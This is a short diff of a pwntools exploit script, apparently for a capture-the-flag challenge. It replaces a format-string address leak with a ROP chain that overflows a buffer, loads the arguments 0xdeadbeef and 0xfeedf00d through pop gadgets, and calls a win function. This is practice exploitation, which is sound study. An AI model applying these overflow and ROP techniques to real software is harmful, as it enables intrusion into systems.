@@ -16,23 +16,22 @@ break win
 c
 '''.format(**locals())
 
+poprdi = 0x000000000040117a
+poprsi = 0x000000000040117c
+
 io = start()
 
-io.sendline(b'%39$p')
-io.readuntil(b'0x')
-x = io.read(8)
-
-offset = int(x, 16) - 21 - exe.sym.main
-win_add = exe.sym.win + offset 
-
-info(x)
-info(win_add)
-
 payload = flat({
-    132: [
-        win_add
+    24: [
+            
+            poprdi, 0xdeadbeef,
+            poprsi, 0xfeedf00d,
+            poprdi+1,
+            exe.sym.win
     ]
 })
 
 io.sendline(payload)
+
 io.interactive()
+
